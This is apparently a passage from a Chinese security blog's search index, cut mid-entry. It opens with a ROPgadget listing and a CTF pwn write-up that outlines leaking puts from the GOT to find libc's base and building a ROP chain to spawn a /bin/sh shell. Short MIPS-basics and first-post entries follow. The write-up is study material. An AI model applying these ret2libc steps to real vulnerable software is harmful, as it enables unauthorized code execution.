1 ; jmp 0x400429</span><br><span class="line">0x00000000004005dc : fmul qword ptr [rax - 0x7d] ; ret</span><br><span class="line">0x0000000000400559 : int1 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x00000000004004bd : je 0x4004d8 ; pop rbp ; mov edi, 0x601040 ; jmp rax</span><br><span class="line">0x000000000040050b : je 0x400520 ; pop rbp ; mov edi, 0x601040 ; jmp rax</span><br><span class="line">0x0000000000400558 : je 0x400551 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x0000000000400293 : jmp 0x40023b</span><br><span class="line">0x000000000040043b : jmp 0x400420</span><br><span class="line">0x000000000040054b : jmp 0x4004e0</span><br><span class="line">0x00000000004005e3 : jmp 0x40065a</span><br><span class="line">0x00000000004006eb : jmp qword ptr [rbp]</span><br><span class="line">0x00000000004004c5 : jmp rax</span><br><span class="line">0x0000000000400549 : jne 0x400552 ; jmp 0x4004e2</span><br><span class="line">0x000000000040058e : leave ; ret</span><br><span class="line">0x0000000000400432 : loop 0x400448 ; and byte ptr [rax], al ; push 0 ; jmp 0x400429</span><br><span class="line">0x0000000000400533 : mov byte ptr [rip + 0x200b06], 1 ; ret</span><br><span class="line">0x0000000000400589 : mov eax, 0 ; leave ; ret</span><br><span class="line">0x000000000040055c : mov ebp, esp ; call rax</span><br><span class="line">0x00000000004004c0 : mov edi, 0x601040 ; jmp rax</span><br><span class="line">0x000000000040055b : mov rbp, rsp ; call rax</span><br><span class="line">0x00000000004004c8 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class="line">0x00000000004005f8 : nop dword ptr [rax + rax] ; ret</span><br><span class="line">0x0000000000400515 : nop dword ptr [rax] ; pop rbp ; ret</span><br><span class="line">0x000000000040050c : or ebx, dword ptr [rbp - 0x41] ; adc byte ptr [rax], spl ; jmp rax</span><br><span class="line">0x0000000000400536 : or esp, dword ptr [rax] ; add byte ptr [rcx], al ; ret</span><br><span class="line">0x00000000004005ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005ee : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005f0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005f2 : pop r15 ; ret</span><br><span class="line">0x0000000000400560 : pop rbp ; jmp 0x4004e1</span><br><span class="line">0x0000000000400532 : pop rbp ; mov byte ptr [rip + 0x200b06], 1 ; ret</span><br><span class="line">0x00000000004004bf : pop rbp ; mov edi, 0x601040 ; jmp rax</span><br><span class="line">0x00000000004005eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005ef : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004004d0 : pop rbp ; ret</span><br><span class="line">0x00000000004005f3 : pop rdi ; ret</span><br><span class="line">0x00000000004005f1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004005ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400436 : push 0 ; jmp 0x400425</span><br><span class="line">0x0000000000400446 : push 1 ; jmp 0x400425</span><br><span class="line">0x0000000000400456 : push 2 ; jmp 0x400425</span><br><span class="line">0x000000000040055a : push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x0000000000400419 : ret</span><br><span class="line">0x0000000000400452 : ror byte ptr [rbx], cl ; and byte ptr [rax], al ; push 2 ; jmp 0x400429</span><br><span class="line">0x000000000040050a : sal byte ptr [rbx + rcx + 0x5d], 0xbf ; adc byte ptr [rax], spl ; jmp rax</span><br><span class="line">0x00000000004004bc : sal byte ptr [rcx + rdx + 0x5d], 0xbf ; adc byte ptr [rax], spl ; jmp rax</span><br><span class="line">0x0000000000400557 : sal byte ptr [rcx + rsi*8 + 0x55], 0x48 ; mov ebp, esp ; call rax</span><br><span class="line">0x0000000000400605 : sub esp, 8 ; add rsp, 8 ; ret</span><br><span class="line">0x0000000000400604 : sub rsp, 8 ; add rsp, 8 ; ret</span><br><span class="line">0x00000000004004ca : <span class="built_in">test</span> byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004005fa : <span class="built_in">test</span> byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x0000000000400556 : <span class="built_in">test</span> eax, eax ; je 0x400553 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x0000000000400555 : <span class="built_in">test</span> rax, rax ; je 0x400554 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 87</span><br></pre></td></tr></table></figure><p>该程序中没有可以执行syscall这类可以执行系统调用的Gadget，但可以先想办法获取一些如libc等动态链接库的加载地址，再用libc中的gadget构造ROP。</p><p>用IDA打开，可以看到动态链接库libc的初始化加载函数<code>_libc_csu_init</code>，找到该函数末尾对应的gadget为<code>0x00000000004005f3 : pop rdi ; ret</code></p><p>ELF文件中通常存在.GOT.PLT和.PLT两个特殊的节，ELF编译时无法知道libc等动态链接库的加载地址，若想要调动动态链接库的函数，就必须使用.GOT.PLT和.PLT配合完成调用。</p><p>如果在程序段中有call _printf,其实并不是跳转到了实际的 _printf 函数位置，而是跳转到了PLT表中的 _printf 项，同时.PLT表作为一段代码，会从内存中取出 _printf 的实际地址进行跳转，而.GOT.PLT就是存放这一实际地址的地方</p><p>回到该ROP题，该程序的.GOT.PLT表如下所示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0000000000601000</span><br><span class="line">.got.plt:0000000000601000 ; Segment type: Pure data</span><br><span class="line">.got.plt:0000000000601000 ; Segment permissions: Read&#x2F;Write</span><br><span class="line">.got.plt:0000000000601000 _got_plt        segment qword public &#39;DATA&#39; use64</span><br><span class="line">.got.plt:0000000000601000                 assume cs:_got_plt</span><br><span class="line">.got.plt:0000000000601000                 ;org 601000h</span><br><span class="line">.got.plt:0000000000601000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC</span><br><span class="line">.got.plt:0000000000601008 qword_601008    dq 0                    ; DATA XREF: sub_400420↑r</span><br><span class="line">.got.plt:0000000000601010 qword_601010    dq 0                    ; DATA XREF: sub_400420+6↑r</span><br><span class="line">.got.plt:0000000000601018 off_601018      dq offset puts          ; DATA XREF: _puts↑r</span><br><span class="line">.got.plt:0000000000601020 off_601020      dq offset __libc_start_main</span><br><span class="line">.got.plt:0000000000601020                                         ; DATA XREF: ___libc_start_main↑r</span><br><span class="line">.got.plt:0000000000601028 off_601028      dq offset gets          ; DATA XREF: _gets↑r</span><br><span class="line">.got.plt:0000000000601028 _got_plt        ends</span><br><span class="line">.got.plt:0000000000601028</span><br></pre></td></tr></table></figure><p>可以看到puts函数地址保存到0x601018位置，根据puts函数在libc库中的偏移地址，就能算出libc库的基地址，然后利用libc中的Gadget构造可以执行<code>/bin/sh</code>的ROP，从而获得shell。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MIPS-入门</title>
      <link href="2020/11/19/MIPS-%E5%85%A5%E9%97%A8/"/>
      <url>2020/11/19/MIPS-%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>要学习IOT逆向，准备入手的思科路由器是MIPS架构，在开始动手前先熟悉一下MIPS相关基础</strong></p><a id="more"></a><h4 id="1-特点"><a href="#1-特点" class="headerlink" title="1.特点"></a>1.特点</h4><ul><li>MIPS指令为固定4字节</li><li>内存中的数据访问必须严格对齐</li><li>本身不支持NX</li><li>MIPS默认不把子函数的返回地址存放到栈中，而是存放到$ra寄存器中</li></ul><h4 id="2-寄存器"><a href="#2-寄存器" class="headerlink" title="2.寄存器"></a>2.寄存器</h4><table><thead><tr><th>寄存器编号</th><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>$0</td><td>$zero</td><td>总是返回常量0</td></tr><tr><td>$1</td><td>$at</td><td>保留给汇编器，不可做其他用途</td></tr><tr><td>$2-$3</td><td>$v0-$v1</td><td>函数调用返回值，非浮点</td></tr><tr><td>$4-$7</td><td>$a0-$a3</td><td>函数调用参数，不够时使用堆栈传递</td></tr><tr><td>$8-$15</td><td>$t0-$t7</td><td>临时寄存器</td></tr><tr><td>$16-$23</td><td>$s0-$s7</td><td>保存，函数调用后这些寄存器需要被恢复</td></tr><tr><td>$24-$25</td><td>$t8-$t9</td><td>临时寄存器的补充</td></tr><tr><td>$28</td><td>$gp</td><td>全局指针，指向静态数据区中运行决定的地址</td></tr><tr><td>$29</td><td>$sp</td><td>堆栈指针</td></tr><tr><td>$30</td><td>$fp/$s8</td><td>栈帧指针</td></tr><tr><td>$31</td><td>$ra</td><td>返回地址，用于支持函数调用和子程序</td></tr></tbody></table><h4 id="3-指令集"><a href="#3-指令集" class="headerlink" title="3.指令集"></a>3.指令集</h4><p>MIPS指令长度为32位，其中指令位均为6位，其余26位可分为R型、I型、J型。常用参考指令表如下：</p><table><thead><tr><th>指令</th><th>功能</th><th>实例</th></tr></thead><tbody><tr><td>li</td><td>将一个最大16位的数立即存入寄存器</td><td>li $Rd, imm</td></tr><tr><td>lui</td><td>将一个最大16位的数立即放入寄存器的高16位，低16位补0</td><td>lui $a1, 0x42</td></tr><tr><td>lw</td><td>从一个指定的地址加载一个字的值到寄存器</td><td>lw $s0, 0($sp)</td></tr><tr><td>sw</td><td>将寄存器中的值存入指定地址</td><td>sw $a0, 0($sp)</td></tr><tr><td>add</td><td>带符号数相加，目标数存于第一个寄存器地址内</td><td>add $t0, $t1, $t2</td></tr><tr><td>sub</td><td>带符号数相减</td><td>sub $t0, $t1, $t2</td></tr><tr><td>mult</td><td>乘法，结果存于(Hi,Lo)中</td><td>mult $t3, $t4</td></tr><tr><td>div</td><td>除法，结果存于(Hi,Lo)中</td><td>div $t5, $t6</td></tr><tr><td>mfhi</td><td>获取Hi中的数值到某寄存器</td><td>mfhi $t0</td></tr><tr><td>mflo</td><td>获取Lo中的数值到某寄存器</td><td>mflo $t1</td></tr><tr><td>beq</td><td>分支跳转，比较两个寄存器的值决定是否跳转，条件为==</td><td>beq $Rs, $Rt, target</td></tr><tr><td>blt</td><td>分支跳转，条件为&lt;</td><td>blt $Rs, $Rt, target</td></tr><tr><td>ble</td><td>分支跳转，条件为&lt;=</td><td>ble $Rs, $Rt, target</td></tr><tr><td>bgt</td><td>分支跳转，条件为&gt;</td><td>bgt $Rs, $Rt, target</td></tr><tr><td>bge</td><td>分支跳转，条件为&gt;=</td><td>bge $Rs, $Rt, target</td></tr><tr><td>bne</td><td>分支跳转，条件为!=</td><td>bne $Rs, $Rt, target</td></tr><tr><td>j</td><td>无条件跳转到某一绝对地址</td><td></td></tr><tr><td>jal</td><td>直接子程序调用，</td><td></td></tr><tr><td>jalr</td><td>间接子程序调用</td><td></td></tr></tbody></table><h4 id="4-MIPS调试环境安装"><a href="#4-MIPS调试环境安装" class="headerlink" title="4.MIPS调试环境安装"></a>4.MIPS调试环境安装</h4><p>主要参考资料：</p><ul><li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/">HWS赛题入门MIPS Pwn</a></li><li><a href="https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi#3-zhi-ling-ge-shi">mips汇编学习</a></li><li><a href="https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi#3-zhi-ling-ge-shi">CTF-MIPS-入门指南</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>由此开始</title>
      <link href="2020/11/19/%E7%94%B1%E6%AD%A4%E5%BC%80%E5%A7%8B/"/>
      <url>2020/11/19/%E7%94%B1%E6%AD%A4%E5%BC%80%E5%A7%8B/</url>
      
        <content type="html"><![CDATA[<p>记于2020年11月19日，晴</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
